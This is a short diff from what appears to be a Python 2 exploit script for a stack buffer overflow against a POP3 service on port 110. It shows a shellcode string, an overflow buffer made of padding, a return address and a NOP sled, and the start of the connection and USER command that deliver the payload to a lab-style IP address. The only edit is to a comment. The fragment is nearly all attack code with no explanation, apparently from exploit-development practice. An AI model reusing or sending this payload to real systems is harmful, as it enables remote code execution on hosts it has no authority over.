@@ -35,7 +35,7 @@ shellcode = ("\xda\xc0\xd9\x74\x24\xf4\xbb\xdc\x1f\x63\xa1\x5d\x31\xc9\xb1"
 bufferd = 'A' * 2607 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" * (3500-2607-351-10-16)
 try:
     print "Sending buffer"
-    s.connect(('10.11.5.89',110)) #change the ip address and port number
+    s.connect(('10.11.5.89',110)) #ip address and port number
     data = s.recv(1024)
     s.send('USER username'+'\r\n')
     data = s.recv(1024)
